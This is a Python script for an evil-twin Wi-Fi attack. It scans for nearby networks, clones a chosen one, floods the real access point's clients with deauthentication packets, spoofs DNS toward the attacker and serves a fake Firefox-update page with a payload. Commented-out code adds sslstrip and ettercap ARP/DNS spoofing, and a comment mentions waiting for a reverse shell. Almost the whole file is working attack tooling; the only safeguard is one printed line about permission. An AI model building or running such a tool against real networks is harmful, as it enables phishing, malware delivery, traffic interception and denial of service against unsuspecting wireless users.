import csv 
import signal
import shutil
import time
import subprocess
import os
import argparse
 

# processes that will need to be cleaned up
CLONE_PROC = -1
DHCP_PROC = -1
DNS_PROC = -1 
DEAUTH_PROC = -1

# globally accessible monitor mode interface name
MON_INTERFACE = None

# Colors for printing 
ERROR_COLOR = '\033[91m'
OK_COLOR = '\033[92m'
RESET_COLOR = '\033[0m'
NOTE_COLOR = '\033[93m'


def monitor_mode(ap_interface):
    '''
    Sets the chosen network interface to monitor mode using airmon-ng

    params:
        interface(string): interface to use as an access point
    returns:
        mon_interface(string): interface + '0mon', new name of monitor mode
        interface
    '''
    global MON_INTERFACE
    try:
        print(RESET_COLOR + "[...] initializing network interface...")
        cmd = ['sudo', 'airmon-ng', 'start', ap_interface]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True)
        print(OK_COLOR + "[SUCCESS] initialized network interface!\n")
        MON_INTERFACE = ap_interface + 'mon'
        return
    except:
        print(ERROR_COLOR + "[ERROR] Error occured during Interface Initialization\n")


def collect_target_data(log_prefix):
    '''
    Given an interface which has been put into monitor mode, 
    performs a 30 second wireless packet capture using airmon-ng

    args:
            log_prefix(str): name of prefix for log files 

        return:
            networks(dictionary): target data to be presented to user; total packets captured:(bssid, essid)
        '''
    try:
        print(RESET_COLOR + '[...] aggregating data for potential target networks...')

        networks = {}

        log_file = log_prefix + '-01.csv'
        cmd = 'sudo airodump-ng  {} -w {} '.format(MON_INTERFACE, log_prefix)
        # execute for 30 seconds, then kill

        proc =  subprocess.Popen("exec " + cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, shell=True)
        time.sleep(30)
        proc.kill()
        # to store bssids and essids
        ids = {}
        # read csv, get stats to present to user
        with open (log_file, 'r') as f:
            lines = f.readlines()
            get_packets= False
            for line in lines:
                # if we are at bottom section of data
                if get_packets:
                    data = line.split(',')
                    if len(data) > 1:
                        # Total Packets
                        packets = data[-3]
                        # BSSID
                        bssid = data[-2].replace('\n', '').lstrip(" ")
                        # ESSID
                        essid = data[-1].replace('\n', '').lstrip(" ")
                        for real_bssid, real_essid in ids.items():
                            if (bssid and real_bssid):
                                if bssid == real_bssid:
                                    networks[packets] = (real_bssid, real_essid)
                                    break

                            if (essid and real_essid):
                                if essid == real_essid:
                                    networks[packets] = (real_bssid, real_essid)
                                    break

                else: 
                    data = line.split(',')
                    if (not "BSSID" in line) and (not 'Station MAC' in line) and len(data) > 10:
                        ids[data[0].replace('\n', '').lstrip(" ")] = data[-2].replace('\n', '').lstrip(" ")
                    
                if 'Station MAC' in line:
                    # begin tracking packets 
                    get_packets = True

        print(OK_COLOR + '[SUCCESS] aggregated data for potential target networks!\n')
        return networks
    except:
        print(ERROR_COLOR + '[ERROR] error aggregating data for target networks\n')
        clean()
        exit()


def user_network_decision(network_data):
    '''
    Given a dictionary containing bssids as names and a tuple
    containing total packets and essid, allows to user to decide which network 
    they would like to clone during the evil twin attack
    '''

    #try:
    print(RESET_COLOR + NOTE_COLOR + "\n\nTARGETS FOUND FOR OUR EVIL-TWIN ATTACK!")
    print(RESET_COLOR + "the higher the number of packets transmitted the more likely a victim on the network will be found")
    print(ERROR_COLOR + "be sure to choose a network which you own or have permission to be monkeying with\n ")

    print(RESET_COLOR + "Here are the available target networks:")

    # trim whitespace
    trimmed_data = {int(key.replace(" ", "")): val for key, val in network_data.items()}
    # save keys 
    keys = [*trimmed_data]
    # sort in descending order 
    keys.sort(reverse=True)

    print (NOTE_COLOR + '[index]: Packets -- BSSID -- ESSID')
    print (RESET_COLOR + '--------------------------------------------------')

    for idx in range(0,len(keys)):
        packets = keys[idx]
        bssid = trimmed_data[keys[idx]][0]
        essid = trimmed_data[keys[idx]][1]
        print("[{}]: {} -- {} -- {}".format(idx, packets, bssid, essid))
    decision = int(input("Enter the number of the network you'd like to clone:"))
    if decision < 0 or decision >= len(keys):
        print(ERROR_COLOR + "fucked up on the input m8")
        clean()
        exit()
    else:
        print(decision)
        print(keys[decision])
    return trimmed_data[keys[decision]]
    #except:
    #    print(ERROR_COLOR + "[ERROR] error parsing network data!")
    #    clean()
    #    exit()


        
def clone_network(network, channel=1):
    '''
    clones the user-selected network 

    params:
        - network(tuple): (bssid,essid)
        - mon_interface(string): name of the monitor mode interface
        - channel(int): wireless channel to deploy network on 
    returns:
        - net_clone_process(process): process responsible for running rogue AP
    '''
    global CLONE_PROC

    try:
        print(RESET_COLOR + "\n[...] cloning {}...".format(network[1]))
        cmd = "airbase-ng -a {} --essid {} -c {} {}".format(network[0], network[1], channel, MON_INTERFACE)
        CLONE_PROC =  subprocess.Popen("exec " + cmd, stdout=subprocess.PIPE, shell=True)
        print(OK_COLOR + "[SUCCESS] cloned {}!\n".format(network[1]))
        # allow time for airbase to launch before continuing execution
        time.sleep(2)
        return

    except:
        print(ERROR_COLOR + "[ERROR] error cloning network\n")
        clean()
        exit()




'''
NOTE: this is v2 code, for briding internet so sslstrip can be used
def bridge_internet(eth_iface):
    provide fake access point with internet access (to be completed in version 1.1 for stealth mode)
    params:
        - eth_iface(string): Ethernet interface to use to bridge internet access

    try:
        print("[...] bridging internet access...")

        cmd = 'sudo brctl addbr evil' 
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
        time.sleep(1)
        cmd = 'sudo brctl addif evil {} '.format(eth_iface)
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
        time.sleep(1)
        cmd = 'sudo brctl addif evil at0' 
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
        time.sleep(1)
        cmd = 'sudo ifconfig {} 0.0.0.0 up '.format(eth_iface) 
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
        time.sleep(1)
        cmd = 'sudo ifconfig at0 0.0.0.0 up '
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
        time.sleep(1)
        cmd = 'sudo ifconfig evil up'
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
        time.sleep(1)

        cmd = 'sudo dhclient evil'
        proc = subprocess.Popen("exec " + cmd, stdout=subprocess.PIPE, shell=True)
        time.sleep(1)

        print("[SUCCESS] bridged internet access!")
        return proc

    except:
        print("[ERROR] error bridging internet access!")
        clean()
        exit()
'''


def launch_evil_server():
    '''
    copies html files and payload to apache system directory, then starts apache
    '''

    try:
        print(RESET_COLOR + "[...] migrating files to evil web server...")
        cmd = 'sudo cp -r ./firefox_update/* /var/www/html'
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
        print(OK_COLOR + "[SUCCESS] migrated files to evil web server!\n")

        print(RESET_COLOR + "[...] starting evil web server...")
        cmd = 'sudo systemctl start apache2'
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
        print(OK_COLOR + "[SUCCESS] started evil web server!\n" + RESET_COLOR)
        return
    except:
        print(ERROR_COLOR + "[ERROR] error starting evil web server!\n")
        clean()
        exit()


def get_ip():
    '''
    assigns an IP and subnet to the newly cloned access point
    '''
    try:
        print(RESET_COLOR + "[...] allocating ip and subnet for rogue AP...")
        cmd = 'sudo ip link set up dev at0'
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
        cmd = 'sudo ip addr add 192.168.0.100/24 dev at0'
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
        print(OK_COLOR + "[SUCCESS] created ip and subnet for rogue AP!\n")
        return
    except:
        print(ERROR_COLOR + "[ERROR] error allocating ip and subnet!\n")
        clean()
        exit()

def launch_dhcp():
    '''
    launches a dhcpd server using the configuration file from the repository
    '''
    global DHCP_PROC
    try:
        print(RESET_COLOR + "[...] launching dhcp server...")
        cmd = 'sudo dhcpd -d -f -cf dhcpd_ap.conf at0'
        DHCP_PROC = subprocess.Popen("exec " + cmd, stdout=subprocess.PIPE, shell=True)
        print(OK_COLOR + "[SUCCESS] launched dhcp server!\n")
        return
    except:
        print(ERROR_COLOR + "[ERROR] error launching dhcp server!\n")
        clean()
        exit()

def launch_dns():
    '''
    launches dnschef to redirect all traffic to our machine. 
    FIXME: problem with this is it only works with http
    '''
    global DNS_PROC
    try:
        print(RESET_COLOR + "[...] launching dns server...")
        cmd = 'sudo python3 dnschef/dnschef.py --fakeip 192.168.0.100 --interface 192.168.0.100 -q'
        DNS_PROC = subprocess.Popen("exec " + cmd, stdout=subprocess.PIPE, shell=True)
        print(OK_COLOR + "[SUCCESS] launched dns server!\n" + RESET_COLOR)
        return
    except:
        print(ERROR_COLOR + "[ERROR] error launching dns server!\n")
        clean()
        exit()


def deauth_clients(bssid):
    '''
    disconnects clients from target AP that we cloned

    params:
        bssid(string): bssid of the original AP that we want to disconnect clients from
    returns:
        deauth_proc(process): process responsible for deauthenticating clients
    '''
    global DEAUTH_PROC

    try:
        print(RESET_COLOR + "[...] deauthing clients...")
        cmd = 'sudo aireplay-ng --deauth 0 -a {} {} --ignore-negative-one'.format(bssid, MON_INTERFACE)
        DEAUTH_PROC = subprocess.Popen("exec " + cmd, stdout=subprocess.PIPE, shell=True)
        print(OK_COLOR + "[SUCCESS] deauthed clients!\n" + RESET_COLOR)
    except:
        print(ERROR_COLOR + "[ERROR] error deauthing clients!")
        clean()
        exit()



'''
V2 code
def establish_routing():
    
    establishes routing rules for the newly cloned access point 
    

    print("[...] establishing routing for rouge AP...")
    cmd = 'sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1'
    result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
    
    cmd = 'sudo cp /proc/sys/net/ipv4/ip_forward ./ip_forward.temp'
    result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
    cmd = 'sudo echo \'1\' > /proc/sys/net/ipv4/ip_forward'
    result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
    print("[SUCCESS] started evil web server!")

def strip_https():
  
    adds chain to the nat iptable to allow sslstrip to intercept packets
    and launches sslstrip on port 6666
    
    print("[...] configuring ip tables")
    cmd = ['sudo', 'iptables', '--flush', '-t', 'nat']
    result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True)

    cmd = ['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', 'at0', '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', '6666' ]
    #cmd = ['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', 'evil', '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', '6666' ]
    #cmd = ['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', 'wlp2s0mon', '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', '6666' ]
    result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True)
    print("[SUCCESS] configured ip tables")

    print("[...] starting sslstrip sessions")
    cmd = 'sudo sslstrip -l 6666'
    proc =  subprocess.Popen("exec " + cmd, stdout=subprocess.PIPE, shell=True)
    print("[SUCCESS] started sslstrip sessions")
    pass


def redirect_traffic():

    performs arp and dns spoofing with ettercap

    print("[...] configuring traffic redirection")
    cmd = 'sudo ettercap -T -q -M arp -P dns_spoof /// /// -i at0'
    #cmd = 'sudo ettercap -T -q -M arp -P dns_spoof /// /// -i evil'
    #cmd = 'sudo ettercap -T -q -M arp -P dns_spoof /// /// -i wlp2s0mon'
    proc =  subprocess.Popen("exec " + cmd, stdout=subprocess.PIPE, shell=True)
    print("[SUCCESS] configured traffic redirection")
    return proc
'''

def clean():
    '''
    restore monitor to managed mode, remove access point process,
    and stop apache websersver

    params:
        - mon_interface(string): monitor mode interface
        - net_clone_proc(subprocess): kills the network process
    '''
    try:
        print(RESET_COLOR + "[...] restoring network interface to managed mode...")
        cmd = ['sudo', 'airmon-ng', 'stop', MON_INTERFACE]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True)
        print(OK_COLOR + "[SUCCESS] restored network interface to managed mode!\n")

        print(RESET_COLOR + "[...] killing evil web server...")
        cmd = ['sudo', 'systemctl', 'stop', 'apache2']
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True)
        print(OK_COLOR + "[SUCCESS] killed evil web server!\n")

        print(RESET_COLOR + "[...] wiping dump files...")
        cmd = 'sudo rm -rf dump*'
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
        print(OK_COLOR + "[SUCCESS] wiped dump files!\n")

        # TODO: delete dump files 
        if CLONE_PROC != -1:
            print(RESET_COLOR + "[...] killing network cloning process...")
            CLONE_PROC.kill()
            print(OK_COLOR + "[SUCCESS] killed network cloning process!\n")
        if DHCP_PROC != -1:
            print(RESET_COLOR + "[...] killing dhcp process...")
            DHCP_PROC.kill()
            print(OK_COLOR + "[SUCCESS] killed dhcp process!\n")
        if DNS_PROC != -1:
            print(RESET_COLOR + "[...] removing traffic redirection (dns spoofing)...")
            DNS_PROC.kill()
            print(OK_COLOR + "[SUCCESS] removed traffic redirection (dns spoofing)!\n")
        if DEAUTH_PROC != -1:
            print(RESET_COLOR + "[...] killing deauthentication proccess...")
            DEAUTH_PROC.kill()
            print(OK_COLOR + "[SUCCESS] killed deauthentication process!\n")

        ''' V2 code
        print("[...] powering off virtual AP interface...")
        cmd = ['sudo', 'ip', 'link', 'delete', 'at0']
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True)
        print("[SUCCESS] powered off virtual AP interface!")

        cmd = ['sudo', 'ifconfig', 'evil', 'down']
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True)
        cmd = ['sudo', 'brctl', 'delbr', 'evil']
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True)
        print("[SUCCESS] powered off virtual AP interface!")


        print("[...] flushing ip tables")
        cmd = ['sudo', 'iptables', '--flush', '-t', 'nat']
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True)
        print("[SUCCESS] flushed ip tables")

        print("[...] killing sslstrip sessions")
        cmd = ['sudo', 'sslstrip', '-k']
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True)
        print("[SUCCESS] killed sslstrip sessions")
        '''


        print(OK_COLOR + "\n\nexited gracefully")
    except:
        print(ERROR_COLOR + "[ERROR] Error occured during clean")



def sig_handler(signal, frame):
    print(NOTE_COLOR + "\n[...] shutting off")
    clean()
    exit()


def check_root():
    """
    Checks if program is run by the root user.
    """
    if os.geteuid() != 0:
        exit(ERROR_COLOR + " run it as root")



def main():
    """
    Main Driver
    """
    signal.signal(signal.SIGINT, sig_handler)
    log_prefix = 'dump'
    # check for root access
    check_root()
    # get the network interface from the user
    parser = argparse.ArgumentParser()
    parser.add_argument('ap_interface', help='network interface to use to create rogue access point', type=str)
    # uncomment this line for next version bridged internet update
    #parser.add_argument('eth_interface', help='network interface to use to maintain upstream internet connectivity', type=str)
    args = parser.parse_args()
    interface = args.ap_interface
    # change the network card to monitor mode
    monitor_mode(interface)
    # capture wireless packets (recon)
    network_data = collect_target_data(log_prefix)
    # present user with option of network to clone and allow for them to decide
    target_network = user_network_decision(network_data)
    # create the evil twin
    net_clone_proc = clone_network(target_network)
    # launch evil web server
    launch_evil_server()
    # allocate an ip and subnet for ap
    get_ip()
    # setup a dhcp server to let clients know that we are the router
    launch_dhcp()
    # setup dnschef
    launch_dns()
    # deauthorize clients of legitimate network
    deauth_clients(target_network[0])

    # bridge internet (v2)
    #bridge_internet(eth_interface)
    # strip outgoing https traffic, reducing to http and (v2)
    #strip_https() 
    # perform arp and dns spoofing (v2)
    #spoof_process = redirect_traffic()

    input("[!] Phishing server deployed, waiting for client to connect.\nPress Ctrl-C to exit.")
    # wait for reverse shell, then show user ip and port 
    #while(
    clean()
    exit()



if __name__ == '__main__':
    main()
